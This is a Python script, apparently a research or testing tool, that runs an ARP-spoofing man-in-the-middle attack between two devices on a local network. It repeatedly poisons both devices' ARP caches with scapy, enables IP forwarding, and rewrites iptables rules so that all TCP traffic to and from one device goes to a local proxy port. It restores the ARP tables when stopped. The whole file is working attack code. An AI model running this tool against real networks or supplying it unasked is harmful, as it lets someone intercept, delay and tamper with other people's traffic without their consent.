import subprocess,argparse,netifaces,configparser,iptc,os
from pick import pick
from scapy.all import Ether, ARP, srp, send
import time

def list_interfaces():
    iface, index = pick(netifaces.interfaces(), 'Please choose the wireless interface used for hotspot')
    return iface

def clean_iptables():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=1")
    existing_nat = iptc.easy.dump_chain('nat','PREROUTING')
    existing_filter = iptc.easy.dump_chain('filter','FORWARD')
    for rule in existing_nat:
        iptc.easy.delete_rule('nat','PREROUTING',rule)
    for rule in existing_filter:
        iptc.easy.delete_rule('filter','FORWARD',rule)


def setup_iptables(addr1,addr2,net_if,port): # hub, device
    existing_nat = iptc.easy.dump_chain('nat','PREROUTING')
    existing_filter = iptc.easy.dump_chain('filter','FORWARD')

    if existing_nat and existing_filter:
        for rule in existing_nat:
            iptc.easy.delete_rule('nat','PREROUTING',rule)
        for rule in existing_filter:
            iptc.easy.delete_rule('filter','FORWARD',rule)


    os.system("sudo sysctl -w net.ipv4.ip_forward=1")
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0")

    redirect_rules = [
    {
        'src':addr2,'protocol':'tcp','multiport':{'dports': '0:65535'}, 'target': {'REDIRECT': {'to-ports': str(port)}}
    },
    # {
    #     'src':addr1,'protocol':'tcp','multiport':{'dports': '0:65535'}, 'target': {'REDIRECT': {'to-ports': str(port)}}
    # },
    {
        'dst':addr2,'protocol':'tcp','multiport':{'dports': '0:65535'}, 'target': {'REDIRECT': {'to-ports': str(port)}}
    }
    # ,{
    #     'dst':addr1,'protocol':'tcp','multiport':{'dports': '0:65535'}, 'target': {'REDIRECT': {'to-ports': str(port)}}
    # }
    ]
    
    drop_rules = [
        {'src': addr2, 'protocol':'tcp','multiport':{'dports': '0:65535'},'target': 'DROP'},
        {'dst': addr2, 'protocol':'tcp','multiport':{'dports': '0:65535'},'target': 'DROP'}
    ]

    for rule in drop_rules:
        iptc.easy.insert_rule('filter','FORWARD',rule)
    for rule in redirect_rules:
        iptc.easy.insert_rule('nat','PREROUTING',rule)
    


def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
        

def spoof(target_ip, host_ip, self_mac, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        # self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))


def restore(target_ip, host_ip, verbose=True):
    """
    Restores the normal process of a regular network
    This is done by sending the original informations 
    (real IP and MAC of `host_ip` ) to `target_ip`
    """
    # get the real MAC address of target
    target_mac = get_mac(target_ip)
    # get the real MAC address of spoofed (gateway, i.e router)
    host_mac = get_mac(host_ip)
    # crafting the restoring packet
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    # sending the restoring packet
    # to restore the network to its normal process
    # we send each reply seven times for a good measure (count=7)
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))


def arpspoofing(addr1,addr2, self_mac, verbose): # hub, device
    try:
        print(addr1,addr2,self_mac)
        while True:
            # telling the `target` that we are the `host`
            spoof(addr1, addr2,self_mac,verbose)
            # telling the `host` that we are the `target`
            spoof(addr2, addr1,self_mac,verbose)
            # sleep for one second
            time.sleep(1)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        restore(addr1, addr2,verbose)
        restore(addr2, addr1,verbose)
        clean_iptables()

def local_mac(net_if):
    return netifaces.ifaddresses(net_if)[netifaces.AF_LINK][0]['addr']


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='')
    parser.add_argument("-i", "--interface", type=str, default= '', metavar= 'S', help='network interface to use')
    parser.add_argument('-a','--addr1',type=str, default= '', metavar= 'N', help='1st device address')
    parser.add_argument('-b','--addr2',type=str, default= '', metavar= 'N', help='2nd device address')
    parser.add_argument('-u', '--update', action='store_true', default=False)
    parser.add_argument('-p', '--port', type = int, default=0, metavar= 'P', help='proxy listening port')
    parser.add_argument('-c', '--clean',action='store_true', default=False)

    args = parser.parse_args()
    conf = configparser.ConfigParser()
    conf.read('./delay.conf')

    if args.update:
        net_if = list_interfaces()
        conf.set("common", "interface", net_if)
        addr1 = input("please type in the first address")
        conf.set("common", "addr1",addr1)
        addr2 = input("please type in the first address")
        conf.set("common", "addr2",addr2)
        port = input("listening port of the proxy")
        conf.set("common", "port",port)

        with open("./delay.conf","w") as conf_file:
            conf.write(conf_file)

    else:
        if args.interface == '':
            net_if = conf.get("common",'interface')
        else:
            net_if = args.interface
        if args.addr1 == '':
            hub = conf.get("common",'hub')
        else:
            hub = args.addr1  
        if args.addr2 == '':
            device = conf.get("common",'device')
        else:
            device = args.addr2
        if args.port == 0:
            port = conf.getint("common","port")
        else:
            port = args.port

        if args.clean:
            clean_iptables()
        else:
            setup_iptables(hub,device,net_if,port)
            arpspoofing(hub,device,local_mac(net_if),True)

